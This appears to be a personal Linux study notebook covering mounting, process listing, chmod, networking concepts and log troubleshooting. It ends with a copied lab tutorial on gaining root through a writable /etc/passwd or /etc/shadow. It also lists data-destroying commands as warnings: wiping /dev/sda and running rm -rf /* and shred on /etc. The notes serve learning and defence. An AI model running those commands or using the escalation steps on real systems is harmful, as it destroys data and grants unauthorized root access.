sudo mount /image.iso /media/iso-file -o loop
```

### Mount an NFS
A Network File System (NFS) is a distributed file system protocol for sharing remote directories over a network. Mounting an NFS allows you to work with remote files as if they were stored locally.

Follow the steps below to mount a remote NFS directory on your system:

**Important:** Mounting an NFS requires having the NFS client package installed. See [how to install the NFS server on Ubuntu](https://phoenixnap.com/kb/ubuntu-nfs-server).

1. Create a mount point using the **`mkdir`** command:

```
sudo mkdir /media/nfs
```

2. Mount the NFS share by running:

```
sudo mount /media/nfs
```

3. To automatically mount the remote NFS share at boot, edit the _/etc/fstab_ file using a [text editor](https://phoenixnap.com/kb/best-linux-text-editors-for-coding) of your choice:

```
sudo vi /etc/fstab
```

Add the following line to the file and replace **`remote.server:/dir`** with the NFS server IP address or hostname and the exported directory:

```
remote.server:/dir /media/nfs  nfs      defaults    0       0
```

### Non-Superuser Mounting

Although only a superuser can mount file systems, file systems in the _/etc/fstab_ file containing the **`user`** option can be mounted by any system user.

Edit the _/etc/fstab_ file using a text editor and under the **`<options>`** field specify the **`user`** option. For example:

```
/dev/cdrom /cd iso9660 ro,user,noauto,unhide
```

Adding the line above to _/etc/fstab_ allows any system user to mount the **`iso9660`** file system from a CD-ROM device.

Specifying the **`users`** option instead of **`user`** allows any user to unmount the file system, not only the user that mounted it.

### Move a Mount

If you decide to move a mounted file system to another mount point, use the **`-M`** option. The syntax is:

```
mount --move [olddir] [newdir]
```

For **`[olddir]`**, specify the current mount point. For **`[newdir]`**, specify the mount point to which you want to move the file system.

Moving the mounted file system to another mount point causes its contents to appear in the **`[newdir]`** directory but doesn't change the physical location of the files.

## How to Unmount a File System

To unmount, i.e., detach an attached file system from the system tree, use the **`umount`** command. Detach the file system by passing either its mount point or the device name.

The syntax is:

```
umount [dir]
```

or

```
umount [device]
```

For example, to detach a USB device listed as **`/dev/sdb1`**, run:

```
umount /dev/sdb1
```


![[Pasted image 20240518012145.png]]

While busy with open files or ongoing processes, a file system cannot be detached, and the process fails. If you aren't sure what's using the file system, run the [fuser command](https://phoenixnap.com/kb/fuser-linux) to find out:

```
fuser -m [dir]
```

For **`[dir]`**, specify the file system mount point. For example:

```
fuser -m /media/usb-drive
```

### Lazy Unmount

If you don't want to stop the processes manually, use the lazy unmount, which instructs the **`unmount`** command to detach the file system as soon as its activities stop. The syntax is:

```
umount --lazy [device]
```

### Forced Unmount

The **`-f`** (**`--force`**) option allows users to force an unmount. However, be cautious when force unmounting a file system as the process **may corrupt the data** on it.

The syntax is:

```
umount -f [dir]
```

----



## wget 

![[Pasted image 20240212234149.png]]

> python3 -m http.server - running http server and run it where it tells you:
![[Pasted image 20240212235354.png]]

> kill <*processID*> - (kill 1332) terminate process
![[Pasted image 20240212235636.png]]

5 different way of killing a process:

> kill <-number> <*PID>  -> kill -9 1332 

![[Pasted image 20240217005126.png]]

You can view the process here:

## List Running Process in Linux

## Processes in Linux

**Processes** in Linux start every time you launch [an application](https://phoenixnap.com/glossary/what-is-an-application) or run a command. While each command creates one process, applications create and run multiple processes for different tasks.

By default, each new process starts as a **foreground** process. This means it must finish before a new process can begin. [Running processes in the background](https://phoenixnap.com/kb/linux-run-command-background) allows you to perform other tasks at the same time.

Frequently used **ps** command options include:

- **`a`**: List all ruining processes for all users.
- **`-A, -e`**: List all processes on the system.
- **`-a`**: List all processes except session leaders (instances where the [process ID](https://phoenixnap.com/glossary/process-id) is the same as the session ID) and processes not associated with a terminal.
- **`-d`**: List all processes except session leaders.
- **`--deselect, -N`**: List all processes except those that fulfill a user-defined condition.
- **`f`**: Displays process hierarchy as ASCII art.
- **`-j`**: Displays output in the jobs format.
- **`T`**: List all processes associated with this terminal.
- **`r`**: Only list running processes.
- **`u`**: Expand the output to include additional information, for example, CPU and memory usage.
- **`-u`**: Define a user whose processes you want to list.
- **`x`**: Include processes without a TTY.
Running the **`ps`** command without any options produces an output similar to:

![Running the ps command without any options](https://phoenixnap.com/kb/wp-content/uploads/2021/09/list-running-processes-linux-01-no-arguments.png)

The default output includes the following categories:

- **PID**: Process identification number.
- **TTY**: The type of terminal the process is running on.
- **TIME**: Total amount of CPU usage.
- **CMD**: The name of the command that started the process.

Using the combination of **`a`**, **`u`**, and **`x`** options results in a more detailed output:

> ps aux

![[Pasted image 20240213000204.png]]

The new categories of the expanded output include:

- **USER**: The name of the user running the process.
- **%CPU**: The CPU usage percentage.
- **%MEM**: The [memory usage](https://phoenixnap.com/kb/linux-commands-check-memory-usage) percentage.
- **VSZ**: Total [virtual memory](https://phoenixnap.com/glossary/virtual-memory-definition) used by the process, in kilobytes.
- **RSS**: Resident set size, the portion of RAM occupied by the process.
- **STAT**: The current process state.
- **START**: The time the process was started.

To display the running processes in a hierarchical view, enter:

![[Pasted image 20240518013602.png]]

**Note:** When using more than one **`ps`** command option containing a dash symbol ("**-**"), you only need to use one dash symbol before listing the options. For instance, to use the **`ps`** command with the **`-e`** and **`-f`** options, type **`ps -ef`**.

Filter the list of processes by user with:

```
ps -U [real user ID or name] -u [effective user ID or name] u
```

For example, showing a list of processes started by the user called **phoenixnap**:

```
ps -U phoenixnap -u phoenixnap u
```

![[Pasted image 20240518013704.png]]

### List Running Processes in Linux by Using the top Command

The [**`top`** command](https://phoenixnap.com/kb/top-command-in-linux) displays the list of running processes in the order of decreasing [CPU usage](https://phoenixnap.com/kb/check-cpu-usage-load-linux). This means that the most resource-heavy processes appear at the top of the list:

![[Pasted image 20240518013747.png]]

The output of the **`top`** command updates in real time, with the three-second default refresh rate. The **`top`** command output contains the following categories:

- **PID**: Process identification number.
- **USER**: The name of the user running the process.
- **PR**: The scheduling priority for the process.
- **NI**: The nice value of the process, with negative numbers indicating higher priority.
- **VIRT**: The virtual memory amount used by the process.
- **RES**: The resident (physical) memory amount used by the process.
- **SHR**: The total shared memory used by the process.
- **S**: The status of the process - R (running) or S (sleeping).
- **%CPU**: The percentage of CPU usage.
- **%MEM**: The memory usage percentage.
- **TIME+**: Total CPU usage amount.
- **COMMAND**: The name of the command that started the process.

While the **`top`** command is running, use the following options to interact with it or change the output format:

- **c**: Display the absolute process path.
- **d**: Change the output refresh rate to a user-defined value (in seconds).
- **h**: Display the help window.
- **k**: Kill a process by providing the PID.
- **M**: Sort the list by memory usage.
- **N**: Sort the list by PID.
- **r**: Change the nice value (priority) of a process by providing the PID.
- **z**: Change the output color to highlight running processes.
- **q**: Quit the command interface.

### List Running Processes in Linux by Using the htop Command

The **`htop`** command offers the same output as the **`top`** command but in an easier-to-understand and user-friendly way.

Since most Linux distributions don't include this command, install it with:

```
sudo apt install htop
```

Using the **`htop`** command provides the following output:

![[Pasted image 20240518013918.png]]

- **Directional keys**: Scroll the process list vertically and horizontally.
- **F1**: Open the help window.
- **F2**: Open the htop command setup.
- **F3**: Search for a process by typing the name.
- **F4**: Filter the process list by name.
- **F5**: Switch between showing the process hierarchy as a sorted list or a tree.
- **F6**: Sort processes by columns.
- **F7**: Decrease the nice value (increase priority) of a process.
- **F8**: Increase the nice value (decrease priority) of a process.
- **F9**: Kill the selected process.
- **F10**: Exit the command interface.



> ![[Pasted image 20240212235744.png]]

 look for logs on your server:

![[Pasted image 20240213001646.png]]

go to apache2 directory and look for user logs:

![[Pasted image 20240213001913.png]]

-> ls -> less access.log.1

![[Pasted image 20240213002016.png]]

see process running in background:

> ps -eF

> ps aux

Legenda: PID = Process ID | User = user name | PR = Priority | NI = Nice Value | VR = Virtual Image (misured in Kbyte) |  RES = Resided size (kb) | SHR = Shared Memory Size (kb) | S = Process Status
COMMAND: Answers the question: "what command started this process?"

NI Value: "-20" most likely to receive priority "0" Default NI "+19" Least likely to receive priority

run a script in a specific time (install "at" package):

![[Pasted image 20240217010517.png]]

run simple http server:

> python3 -m http.server

# chmod (change mode)

![[Pasted image 20240927162542.png]]
/etc/passwd contains all the users


Example:

```text
chmod 720 readme.txt
```

Each number in the **mode parameter** represents the permissions for a user or group of users:

- The first number represents the file’s owner.
- The second number represents the file’s group.
- The third number represents everyone else.

The **_Change Mode (chmod) Meaning & Mode Parameters Reference Table_** below shows the eight numbers that can be used within the **chmod** parameter. The **rwx** column specifies read, write, and execute access, offering a binary value for each operation. A **_"1"_** means **_"yes,"_** a **_"0"_** means **_"no."_** If **rwx** reads **110**, then that permission may read and write, but not execute.

## Mode Parameters Reference Table

![[Pasted image 20241216105019.png]]

|     |                          |     |     |
| --- | ------------------------ | --- | --- |
| #   | Permission               | rwx |     |
| 0   | none                     | 000 |     |
| 1   | execute only             | 001 |     |
| 2   | write only               | 010 |     |
| 3   | write and execute        | 011 |     |
| 4   | read only                | 100 |     |
| 5   | read and execute         | 101 |     |
| 6   | read and write           | 110 |     |
| 7   | read, write, and execute | 111 |     |

---

I permessi dei file possono essere rappresentati anche tramite numeri decimali nella chiamata **chmod**. Fino a **4 cifre** possono essere impostate, dove la cifra iniziale è opzionale e serve per specificare i flag speciali **setuid**, **setgid** e **sticky**. Le restanti **3 cifre** rappresentano i permessi di lettura, scrittura ed esecuzione.

Per comprendere meglio, ecco un esempio di come funzionano i permessi dei file in Linux:

1. **Tipo di file**: Il primo carattere indica il tipo di file. Può essere un file regolare ( `-` ), una directory ( `d` ), un collegamento simbolico ( `l` ) o un altro tipo speciale di file.
2. **Triplette di permessi**: I successivi nove caratteri rappresentano i permessi del file, suddivisi in tre triplette di tre caratteri ciascuna. La prima tripletta mostra i permessi del proprietario, la seconda quelli del gruppo e l’ultima tripletta quelli degli altri utenti.
3. **Significato dei permessi**:
    - **Lettura ®**: Il file è leggibile. puoi visualizzarne il contenuto.
    - **Scrittura (w)**: Il file può essere modificato.
    - **Esecuzione (x)**: Il file può essere eseguito.
    - **Setuid (s)**: Se presente nella tripletta dell’utente, imposta il bit setuid. Quando i flag setuid o setgid sono impostati su un file eseguibile, il file viene eseguito con i privilegi del proprietario e/o del gruppo.
    - **Sticky (t)**: Se presente nella tripletta degli altri utenti, imposta il bit sticky.

Oltre a questa rappresentazione simbolica, è possibile utilizzare numeri decimali per i permessi. Ad esempio, **r (lettura) = 4**, **w (scrittura) = 2** e **x (esecuzione) = 1**. [Quindi, un permesso come **rw-** sarebbe rappresentato come **6** (4 + 2), mentre **r–** sarebbe **4** (solo lettura)](https://linuxize.com/post/chmod-command-in-linux/) [1](https://linuxize.com/post/chmod-command-in-linux/)[2](https://hpc-wiki.info/hpc/Chmod)[3](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits).

Il **quarto numero** nella chiamata **chmod** è opzionale e viene utilizzato per specificare i **flag speciali**. Questi flag includono:

1. **Setuid (s)**: Se presente nella tripletta dell’utente, imposta il bit setuid. Quando i flag setuid o setgid sono impostati su un file eseguibile, il file viene eseguito con i privilegi del proprietario e/o del gruppo.
2. **Setgid (s)**: Simile al setuid, ma si applica ai file eseguibili. Quando un file con il flag setgid viene eseguito, eredita i privilegi del gruppo proprietario del file.
3. **Sticky (t)**: Se presente nella tripletta degli altri utenti, imposta il bit sticky. In una directory con il bit sticky impostato, solo il proprietario del file può cancellare o rinominare i file al suo interno.

In breve, il quarto numero in **chmod** consente di gestire questi flag speciali, che influenzano il comportamento dei file e delle directory.


For example, if you set your directory permissions to **720**, then your permissions would function as follows:

- The file’s owner may read, write, and execute the file.
- The file’s group may only write the file.
- All others cannot access the file.

Other examples:

A text file has 666 permissions, which grants read and write permission to everyone. A directory and an executable file have 777 permissions, which grants read, write, and execute permission to everyone.

Setting mode 777 **overwrites special permissions on any file**.  
  
As a result, even normal users can access and execute files. Also, all users can run any command without impersonating a superuser.

What is the 4 digits in chmod?

chmod 4555 equates to the following: **Set UID bit - Run the file as the owner regardless of which user is running it**. User/Owner: Read, Execute. Group: Read, Execute. Others: Read, Execute.

---

linux: 1. TCP/IP Model: The backbone of Linux networking, governing how data packets travel across networks.

2. IP Addresses: Unique identifiers for network devices, including IPv4 and IPv6 formats.

3. Subnetting: Dividing networks into smaller, manageable parts for efficient traffic handling.

4. Routing: Directing data packets across networks from source to destination, using tools like ip, route, and dynamic routing protocols.

5. Network Interfaces: The points of connection between a computer and a network, managed with ifconfig or ip link.

6. DNS: Translating domain names into IP addresses, with utilities like dig and nslookup.

7. DHCP: Dynamically assigning IP addresses to devices, managed with dhclient or dhcpcd.

8. Firewalls: Controlling incoming and outgoing network traffic, using iptables, nftables, or firewalld.

9. SSH: Securely accessing remote systems, primarily through OpenSSH.

10. VPN: Creating secure connections over public networks, with tools like OpenVPN and WireGuard.

11. Network File Systems: Sharing files over a network, using NFS or Samba.

12. Socket Programming: The API for creating networked applications, often explored through languages like C or Python.

13. Network Monitoring and Management: Tools like netstat, SecureShell, tcpdump, and Wireshark for overseeing network performance and troubleshooting issues.

14. Quality of Service (QoS): Prioritizing network traffic to ensure the performance of critical applications, managed with tc.

15. Bonding and Teaming: Combining multiple network interfaces for redundancy or increased throughput.

16. VLANs: Segmenting networks into isolated subnetworks at the data link layer for improved performance and security.

17. Network Namespace: Isolating network environments within a single Linux instance, allowing for more granular control and testing.

18. Wireless Networking: Managing Wi-Fi connections and security, using tools like iwconfig, wpa_supplicant, and hostapd.

19. IPv6 Transition Mechanisms: Supporting the transition from IPv4 to IPv6, including dual-stack, tunneling, and translation techniques.

20. SDN (Software Defined Networking): An emerging area focusing on managing networks through software abstraction layers, offering more flexibility and programmability.

21. Bridging: Connecting multiple network segments at the data link layer, allowing them to behave as a single segment.

22. Network Address Translation (NAT): Modifying network address information in IP packet headers while in transit across a traffic routing device, often used for Internet connection sharing.

23. Port Forwarding: Redirecting communication requests from one address and port number combination to another while the packets traverse a network gateway.

24. IPSec: A suite of protocols for securing Internet Protocol (IP) communications by authenticating and encrypting each IP packet in a data stream.

25. Curl and Wget: Command-line tools for transferring data with URLs, supporting various protocols including HTTP, HTTPS, and FTP.

26. SFTP and SCP: Secure file transfer protocols that use SSH to transfer files.

27. MTR: Combining the functionality of 'traceroute' and 'ping' to provide a detailed path of the network hop by hop.

28. Netfilter: A framework provided by the Linux kernel that allows various networking-related operations to be implemented in the form of customized handlers.

29. SELinux Networking: Enhancing security by providing network-related access controls through the SELinux framework.

30. ARP (Address Resolution Protocol): Resolving IP addresses to MAC addresses, critical for local network communication.

31. SNMP (Simple Network Management Protocol): A protocol for managing devices on IP networks by monitoring network-attached devices for conditions that warrant administrative attention.

32. Quagga/Zebra: Routing software providing implementations of OSPF, RIP, BGP, and more, for Unix platforms, particularly Linux.

33. VRRP (Virtual Router Redundancy Protocol): Allowing for automatic assignment of available IP routers to participating hosts, improving the reliability of the network.

34. Network Booting (PXE): Booting a computer using the network interface independently of data storage devices or installed operating systems.

35. Captive Portals: A technique used to present a web page to the network user before they are granted broader access to network resources.

36. Traffic Shaping: Controlling the volume of traffic being sent into a network in a specified period (bandwidth throttling), often managed with tc.

37. GRE Tunnels: Generic Routing Encapsulation tunnels, a simple protocol for encapsulation of various network layer protocols.

38. 802.1X: A network access control protocol for securing networks with port-based authentication.

39. L2TP: Layer 2 Tunneling Protocol, a tunneling protocol used to support virtual private networks (VPNs) or as part of the delivery of services by ISPs.

40. Network Debugging and Tracing Tools: Tools like strace, lsof, iperf, nmap, and ethtool for diagnosing and resolving network issues.

These concepts and tools further broaden the horizon of possibilities and challenges in Linux networking, catering to a wide array of requirements from basic connectivity to complex network management and security scenarios.

## tldr show command examples


Helpfull forum for installation: https://forum.proxmox.com/threads/tldr-doesnt-work.116520/


-> apt install tldr

![[Pasted image 20240317024229 1.png]]

-> tldr --update

And now it seems to work just fine:

```
root@red:~# tldr ls                                                                                                                                                                                   
ls                                                                                                                                                                                                    
List directory contents.More information: https://www.gnu.org/software/coreutils/ls.                                                                                                                  
                                                                                                                                                                                                      
 - List files one per line:                                                                                                                                                                           
   ls -1                                                                                                                                                                                              
                                                                                                                                                                                                      
 - List all files, including hidden files:                                                                                                                                                            
   ls -a                                                                                                                                                                                              
                                                                                                                                                                                                      
 - List all files, with trailing / added to directory names:                                                                                                                                          
   ls -F                                                                                                                                                                                              
                                                                                                                                                                                                      
 - Long format list (permissions, ownership, size, and modification date) of all files:                                                                                                               
   ls -la                                                                                                                                                                                             
                                                                                                                                                                                                      
 - Long format list with size displayed using human-readable units (KiB, MiB, GiB):                                                                                                                   
   ls -lh                                                                                                                                                                                             
                                                                                                                                                                                                      
 - Long format list sorted by size (descending):                                                                                                                                                      
   ls -lS                                                                                                                                                                                             
                                                                                                                                                                                                      
 - Long format list of all files, sorted by modification date (oldest first):                                                                                                                         
   ls -ltr                                                                                                                                                                                            
                                                                                                                                                                                                      
 - Only list directories:                                                                                                                                                                             
   ls -d */                                                                                                                                                                                           
root@red:~#
```

Fornisce una breve descrizione e degli esempi di comandi:

![[Pasted image 20240317025024 1.png]]


_How to list all open ports in a linux system?_

-> lsof -i 

Cause Netstat command lists ll open ports in the system. With "nmap 127.0.0.1" we only list open ports not filtered of the localhost interface


_How to compress a folder?_

-> tar cvzf file.tgz folder

"cz" arguments create a compressed file, after "f" argument we must specify the file followed by the folder, files or file we want to compress.

**really dangerous commands that you should never run:**

>  cat /dev/zero > /dev/sda

> rm -rf /*

> shred -fu /etc/*

which commands tell you the date and time?

-> date

other commands:

-> time

-> uptime and timestamp( da installa)



_How to check the amount of disk space currently used and available on a Linux system?_

-> df

check the free space available: 

-> free

_how can you list hidden files?_

-> ls -a - show you files and folders that start with ".", which are know as hidden files in Linux systems.


_simple text editor for the Xfce Desktop Environment:_ 

>  mousepad $file.qualcosa   **output:** source code of the code

_see for strings on a file:_

> strings $file or file.type

![[Pasted image 20240322190342.png]]

_Get info of the file:_ (to see if is a binary or what is it)

> file $file

![[Pasted image 20240322190656.png]]

_How to find the version of a file/program?_

> $file --version

![[Pasted image 20240322192844.png]]


## GM Package suite:

## Description

GraphicsMagick's **gm** provides a suite of command-line utilities for creating, converting, editing, and displaying images:

**Gm display** is a machine architecture independent image processing and display facility. It can display an image on any workstation display running an _X_ server.

**Gm import** reads an image from any visible window on an _X_ server and outputs it as an image file. You can capture a single window, the entire screen, or any rectangular portion of the screen.

**Gm montage** creates a composite by combining several separate images. The images are tiled on the composite image with the name of the image optionally appearing just below the individual tile.

**Gm convert** converts an input file using one image format to an output file with the same or differing image format while applying an arbitrary number of image transformations.

**Gm mogrify** transforms an image or a sequence of images. These transforms include **image scaling**, **image rotation**, **color reduction**, and others. The transmogrified image **overwrites** the original image.

**Gm identify** describes the format and characteristics of one or more image files. It will also report if an image is incomplete or corrupt.

**Gm composite** composites images (blends or merges images together) to create new images.

**Gm conjure** interprets and executes scripts in the Magick Scripting Language (MSL).


view os version:

![[Pasted image 20240325215909 1.png]]

go back to "none" directory
> cd\


![[Pasted image 20240325220808 1.png]]

### DNS Lookup with NSlooup

> sudo apt-get install dnsutils


Discover ip and mailing services:

![[Pasted image 20240328154523.png]]

> host $ip

Discover all the devices that are online inside of your network:

> sudo netdiscover


![[Pasted image 20240328154830.png]]


install "pip":

> apt install python3-pip

force linux removal:

![[Pasted image 20240513184257.png]]

force it:

![[Pasted image 20240513184325.png]]



[GitHub - junegunn/fzf: :cherry_blossom: A command-line fuzzy finder](https://github.com/junegunn/fzf)

![[Pasted image 20240516174237.png]]

[This may be my favorite CLI tool ever (youtube.com)](https://www.youtube.com/watch?v=oTNRvnQLLLs)

---

## oh my zsh

![[Pasted image 20240516173833.png]]

---see what this tool does

https://medium.com/@Hackhoven/zsh-vs-bash-3f9fdedc5b8c?source=author_recirc-----05e997a2c22e----1---------------------32d621ed_8629_45c1_aad8_fa011b80ca60-------

---


**Tip:**  You can use nodejs on your shell by just typing "nodejs" (for javascript code review or more)

### 1. How to view processes consuming the most CPU?

```
`$ ps H -eo pid,pcpu | sort -nk2 | tail 
31396  0.6 31396  0.6 31396  0.6 31396  0.6 31396  0.6 31396  0.6 31396  0.6 31396  0.6 30904  1.0 30914  1.0`
```

The most CPU-intensive PID is 30914. Voiceover: Actually, it's 31396.

### 2. What is the service name corresponding to the PID of the most CPU-intensive process?

**Method One:**

```
`$ ps aux | fgrep 30914

work 30914  1.0  0.8 309568 71668 ?  Sl   Feb02 124:44 ./router2 –conf=rs.conf`

The process is ./router2.
```

**Method Two:**

```
`$ ll /proc/30914 

lrwxrwxrwx  1 work work 0 Feb 10 13:27 cwd -> /home/work/im-env/router2 lrwxrwxrwx  1 work work 0 Feb 10 13:27 exe -> /home/work/im-env/router2/router2`
```

Voiceover: Great, the full path is all there.

### 3. How to check the connection status of a specific port?

**Method One:**
```

`$ netstat -lap | fgrep 22022  

0      0 1.2.3.4:22022          *:*                         LISTEN      31396/imui tcp        0      0 1.2.3.4:22022          1.2.3.4:46642          ESTABLISHED 31396/imui tcp        0      0 1.2.3.4:22022          1.2.3.4:46640          ESTABLISHED 31396/imui`

```
**Method Two:**

```
`$ /usr/sbin/lsof -i :22022

COMMAND   PID USER   FD   TYPE   DEVICE SIZE NODE NAME router  30904 work   50u  IPv4 69065770       TCP 1.2.3.4:46638->1.2.3.4:22022 (ESTABLISHED) router  30904 work   51u  IPv4 69065772       TCP 1.2.3.4:46639->1.2.3.4:22022 (ESTABLISHED) router  30904 work   52u  IPv4 69065774       TCP 1.2.3.4:46640->1.2.3.4:22022 (ESTABLISHED)`
```

### 4. How to check the number of connections on a machine?

The SSH daemon (sshd) on 1.2.3.4 is listening on port 22. How can we count the number of connections in various states (TIME_WAIT/ CLOSE_WAIT/ ESTABLISHED) for the sshd service on 1.2.3.4?
```

`$ netstat -n | grep 1.2.3.4:22 | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'

$ netstat -lnpta | grep ssh | egrep "TIME_WAIT | CLOSE_WAIT | ESTABLISHED"
```

![[Pasted image 20240526231818.png]]`

Note: netstat is a commonly used tool for tracing network connection issues, especially when combined with grep/awk, it becomes a powerful tool.

### Querying data from pre-backed up logs

From the pre-backed up service.2022–06–26.log.bz2 log, how many entries contain the keyword 1.2.3.4?

```
$ bzcat service.2022-06-26.log.bz2 | grep '1.2.3.4' | wc -l 
$ bzgrep '1.2.3.4' service.2022-06-26.log.bz2 | wc -l 
$ less service.2022-06-26.log.bz2 | grep '10.37.9.11' | wc -l

```

![[Pasted image 20240526231937.png]]

Note: Online log files are generally preserved after being compressed with bz2. If decompressed for querying, it consumes a lot of space and time. Therefore, bzcat and bzgrep are essential tools for research and development colleagues to master.


### 6. Backup service tips

Pack up the /opt/web/service_web directory for backup, excluding the logs directory within it, and store the packed file in the /opt/backup directory.

```
tar -zcvf /opt/backup/service_web.tar.gz \ -exclude /opt/web/service_web/logs \ /opt/web/service_web
```

Note: This command is commonly used in online applications. When a project needs to be packed and migrated, it often requires excluding the log directory. The `exclude` parameter is essential to master in such scenarios.

### 7. Querying thread count

Query the total number of threads running for a server's services. When the number of threads on the machine exceeds the threshold for warning, it should quickly identify the relevant process and thread information.

```
ps -eLf | wc -l 

pstree -p | wc -l
```

### Disk alarm, empty the largest file

Find and release space for a large number of exception logs generated by a running Tomcat server on the server. Suppose the file contains the keyword "log" and is larger than 1GB.


```
$ find / -type f -name "*log*" | xargs ls -lSh | more 
$ du -a / | sort -rn | grep log | more 
$ find / -name '*log*' -size +1000M -exec du -h {} \;
```

Step 2: Empty the file.

Assuming the found file is a.log, the correct way to empty it is:

```
$ echo "" > a.log
```

This will immediately release the file space.

Many people might use:

```
$ rm -rf a.log
```

### 9. Display file, filter comments

Display the server.conf file, masking comment lines starting with #.


```
$ sed -n '/^[#]/!p' server.conf 
$ sed -e '/^#/d' server.conf 
$ grep -v "^#" server.conf
```

### 10. Disk IO exception troubleshooting

How to troubleshoot disk IO exceptions, such as slow write or high current usage, please identify the process ID causing the high disk IO exception.

Step 1:

`$ iotop -o`

View all process IDs currently writing to disk.

Step 2: If the write indicators are low and there are basically no major write operations, the disk itself needs to be checked. You can check the system

`$ dmesg`

or

`$ cat /var/log/message`

to see if there are any related disk error messages. At the same time, you can touch an empty file on the slow-write disk to see if the disk failure prevents writing.

# Viewing log files in terminal

## 1. Using cat or less Command

To quickly view the contents of a log file, you can use the cat command. For larger files, consider using less for a more interactive experience.

```
# Using cat  

$ cat /path/to/logfile.log  
# Using less  

$ less /path/to/logfile.log  
# Press 'q' to exit less
```

## 2. Using tail Command

To view the last few lines of a log file in real-time, you can use the tail command.
```

$ tail -f /path/to/logfile.log  
# Press 'Ctrl + C' to stop following the file
```

## 3. Using head Command

To view the beginning of a log file, you can use the head command.

$ head /path/to/logfile.log

## 4. Using grep Command

To search for specific patterns or errors in a log file, you can use the grep command.

$ grep "error" /path/to/logfile.log

## 5. Using journalctl (systemd Journal)

For systems using systemd, you can use journalctl to view system logs.
```

$ journalctl  
# Press 'q' to exit journalctl
```

## 6. Using dmesg Command

To view kernel messages, use the dmesg command.

$ dmesg

## 7. Viewing Multiple Log Files

To view multiple log files simultaneously, you can use the multitail command (may need to be installed).

$ multitail /path/to/logfile1.log /path/to/logfile2.log

Choose the method that best suits your requirements based on the log file’s size, the information you are looking for, and whether you need real-time updates. Adjust the file paths and commands according to your specific environment and preferences.


----

# Free up your Disk Space Regularly — Guideline for an ML Engineer

resource: [Free up your Disk Space Regularly — Guideline for an ML Engineer | by Michał Marcińczuk, Ph.D. | in CodeNLP - Freedium](https://freedium.cfd/https://medium.com/codenlp/free-up-your-disk-space-regularly-guideline-for-an-ml-engineer-c1a9eb94439b)

![[Pasted image 20240531004604.png]]



![[Pasted image 20240531004641.png]]


![[Pasted image 20240531004659.png]]

[#python3](https://medium.com/tag/python3 "Python3")[#machine-learning](https://medium.com/tag/machine-learning "Machine Learning")[#software-development](https://medium.com/tag/software-development "Software Development")[#deep-learning](https://medium.com/tag/deep-learning "Deep Learning")[#software-engineering](https://medium.com/tag/software-engineering "Software Engineering")

see debian linux version:

![[Pasted image 20240607120449.png]]



---

To see?

[How to Enable Ubuntu Remote Desktop | phoenixNAP KB](https://phoenixnap.com/kb/how-to-enable-remote-desktop-ubuntu)

[How to Create Partitions in Linux (phoenixnap.com)](https://phoenixnap.com/kb/linux-create-partition)

https://markus-x-buchholz.medium.com/build-your-own-linux-distribution-a-kernel-compilation-and-virtualization-c8ce0f9808f6

<iframe width="1071" height="581" src="https://www.youtube.com/embed/EjHCteafXQ8" title="Beginner to expert Linux - Homelab work - Working on skills to get into systems engineering roles." frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

https://medium.com/@adil/how-to-develop-a-firewall-in-c-as-a-linux-kernel-module-46899fa7d1e6?source=read_next_recirc-----c57a30814c1d----0---------------------b72636e5_4bc8_4720_aec7_b79f431eaa81-------

---

# Linux-based Privilege Escalation Techniques

For beginners, this blog is a guide to the most common techniques used to elevate privileges on Linux.

> **For this article I have used Tryhack me Linux PrivEsc room, Deploy the machine and login to the “user” account using SSH**

![](https://miro.medium.com/v2/resize:fit:602/1*ZY1vWr7Z_jURTHLJ-QBVIA.png)

## Weak File Permissions — Writable /etc/passwd

Firstly, we should be aware of /etc/passwd file in depth before reaching the point. Inside etc directory, we will get three most important files i.e. **passwd**, **group**, and **shadow**.

- **/etc/passwd:** It is a human-readable text file which stores information of user account.
- **/etc/group:** It is also a human-readable text file which stores group information as well as user belongs to which group can be identified through this file.
- **/etc/shadow:** It is a file that contains encrypted password and information of the account expire for any user.

_Below is an example line from /etc/passwd file. The table beneath denotes different properties/fields of the file content of /etc/passwd file._

![](https://miro.medium.com/v2/resize:fit:542/1*8FtUTk2xBsxCW3Ws0z31Sg.png)

- **Username:** First filed indicates the name of the user which is used to login.

- **Encrypted password:** The **X denote**s encrypted password which is actually stored inside /shadow file. If the user does not have a password, then the password field will have an *****(**asterisk**).
- **User Id (UID):** Every user must be allotted a user ID (UID). UID **0** (zero) is kept for root user and UIDs **1–99** are kept for further predefined accounts, UID **100–999** are kept by the system for the administrative purpose. UID **1000** is almost always the first non-system user, usually an administrator. If we create a new user on our Ubuntu system, it will be given the UID of **1001**.
- **Group Id (GID):** It denotes the group of each user; like as UIDs, the first **100** GIDs are usually kept for system use. The GID of **0** relates to the root group and the GID of **1000** usually signifies the users. New groups are generally allotted GIDs begins from **1000.**
- **Gecos Field:** Usually, this is a set of comma-separated values that tells more details related to the users. The format for the GECOS field denotes the following information:
- User’s full name
- Building and room number or contact person etc.,
- **Home Directory:** Denotes the path of the user’s home directory, where all his files and programs are stored. If there is no specified directory then **/** becomes user’s directory.
- **Shell:** It denotes the full path of the default shell that executes the command (by the user) and displays the results.

**NOTE:** Each field is separated by **(colon)**

> **Abusing the weak permissions of /etc/passwd**

The passwd file on Linux consist of the information regarding the various users on the system. On some (old) systems we are allows to save the password hash in this file as well. If the file has write privileges for all users we can exploit this to access the root user account.

![](https://miro.medium.com/v2/resize:fit:602/1*gdyrs-BHf1JLtVG_Q81gEw.png)

Let’s create an new password using the “openssl” command:

![](https://miro.medium.com/v2/resize:fit:563/1*ghaZOZ2PDVMLrzi2uvwelw.png)

Now let’s create an new entry in the passwd file that is exactly same as the line for the root user and replace the name from “root” to “newroot”. And finally in place of the “x” (The “x” that is present between the 1st and 2nd : sign) let’s use the hash that we just generated.

![](https://miro.medium.com/v2/resize:fit:602/1*ZwA96gMBzykh-MAYxltgeg.png)

**Countermeasures/Recommendations**

- Never make etc/passwd file writable for others and its permissions are always set to world readable and write permissions only for root user.
- Root can set the correct permissions of passwd file with the command

>chmod 644 /etc/passwd 

> **Abusing Weak File Permissions of Readable /etc/shadow file**

The /etc/shadow file contains user password hashes and is usually readable only by the root user. When this file is misconfigured, **and global write access is allowed, this can allow us to overwrite the root password hash with one that we control.**

To do this, let’s first check the file permissions on the /etc/shadow file. In our example, we can see that our user account has read/write access.

